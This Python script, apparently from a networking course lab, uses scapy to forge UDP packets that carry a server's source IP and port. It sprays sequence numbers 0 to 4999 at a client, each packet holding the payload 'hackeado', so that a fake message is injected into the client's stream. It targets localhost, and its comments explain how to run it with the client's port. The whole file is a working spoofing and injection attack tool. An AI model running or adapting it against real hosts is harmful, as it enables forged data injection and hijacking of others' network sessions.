#!/usr/bin/python3
import sys
from scapy.all import UDP, IP, Raw, send, conf, sendp

# command for running the script:
# <client port> varies between clients
# it is obtained from the s.getsockname() print in client terminal
# sudo python3.12 pirate.py 127.0.0.1 1818 127.0.0.1 <client port>
print(conf.route)

def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
    print(f"Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")

    # range of seq nums
    # change start of interval accordingly
    for seq_num in range(0, 5000):
        # hackeado fake payload
        fake_packet = seq_num.to_bytes(2, 'big') + f"hackeado\n".encode()

        # forged packet
        pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_packet)

        # sending forged packet
        print(f"Injecting fake packet with sequence number {seq_num} and payload {fake_packet}")
        send(pirate_packet, verbose=0, iface="lo")


if len(sys.argv) != 5:
    print("Usage: ./pirate.py <server_host> <server_port> <client_ip> <client_port>")
    sys.exit(1)

server_ip = sys.argv[1]
server_port = int(sys.argv[2])
client_ip = sys.argv[3]
client_port = int(sys.argv[4])

inject_pirate_packets(server_ip, server_port, client_ip, client_port)